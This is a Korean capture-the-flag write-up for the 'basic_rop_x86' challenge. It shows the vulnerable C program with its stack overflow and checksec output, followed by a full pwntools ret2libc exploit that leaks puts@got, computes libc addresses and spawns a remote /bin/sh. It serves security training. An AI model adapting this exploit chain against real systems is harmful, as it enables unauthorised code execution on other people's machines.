```c
// Name: basic_rop_x86.c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

```bash
$ checksec ./basic_rop_x86
[*] './basic_rop_x86'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

# 분석

`basic_rop_x86.c` 코드와 `checksec ./basic_rop_x86`의 결과를 볼 때 stack canary를 적용하지 않았으며, NX를 우회해서 쉘을 탈취해야 함을 알 수 있다.

# 취약점

`buf` 배열의 크기는 `0x40`바이트 밖에 안 되는데, `read(0, buf, 0x400);`을 통해 `0x400`바이트의 데이터를 `stdin`을 통해 읽어들이므로 BOF 취약점이 있다.

# 공격

```bash
pwndbg> plt
Section .plt 0x80483e0-0x8048470:
0x80483f0: read@plt
0x8048400: signal@plt
0x8048410: alarm@plt
0x8048420: puts@plt
0x8048430: exit@plt
0x8048440: __libc_start_main@plt
0x8048450: write@plt
0x8048460: setvbuf@plt
```

gdb를 통해 바이너리의 PLT를 확인하면 `puts` 함수가 PLT에 있음을 확인할 수 있다.
`puts` 함수는 `write` 함수와 달리 인자가 하나 뿐이며, 문자열의 크기를 인자로 넘겨줄 필요가 없으므로 다루기가 상대적으로 간단하다.
따라서 `puts` 함수를 이용하여 공격할 방법을 고려해볼 수 있다.

먼저, ROP를 통해 `puts(puts@got);`를 호출하고, 이 함수의 return address를 `main`으로 덮어쓰는 방식으로 `puts@got`를 얻어내고 `main` 함수를 재호출하여 `puts@got`를 활용한 payload를 다시 전송할 수 있도록 한다.

그 후, 얻어낸 `puts@got`를 이용하여 `system("/bin/sh");`를 호출할 수 있는 payload를 구성하여 전송하면 쉘을 탈취할 수 있다.

이때, `checksec`을 통해 얻어낸 `basic_rop_x86`의 아키텍처가 `x86`이므로 함수의 인자는 모두 스택 영역에 위치한다.

```python
# Name: basic_rop_x86.py

from pwn import *

context.arch = 'i386'
context.os = 'linux'
# context.log_level = 'debug'

def slog(name, addr):
    success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 12198

# conn = process('./basic_rop_x86') # local
conn = remote(HOST, PORT)
e = ELF('./basic_rop_x86')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6') # local
libc = ELF('./libc.so.6')

puts_plt = e.plt['puts']
puts_got = e.got['puts']

buf = b'A' * 0x40
padding = b'B' * 0x4
SFP = b'C' * 0x4

payload = buf + padding + SFP

# puts(puts@got)
payload += p32(puts_plt)
payload += p32(e.sym['main'])
payload += p32(puts_got)

conn.send(payload)

conn.recvuntil(buf)

puts = u32(conn.recvn(4))
lb = puts - libc.sym['puts']
system = lb + libc.sym['system']
sh = lb + list(libc.search(b'/bin/sh'))[0]

slog('libc_base', lb)
slog('puts', puts)
slog('system', system)
slog('/bin/sh', sh)

# system("/bin/sh")
payload = buf + padding + SFP
payload += p32(system)
payload += p32(1)
payload += p32(sh)

conn.send(payload)
conn.interactive()
```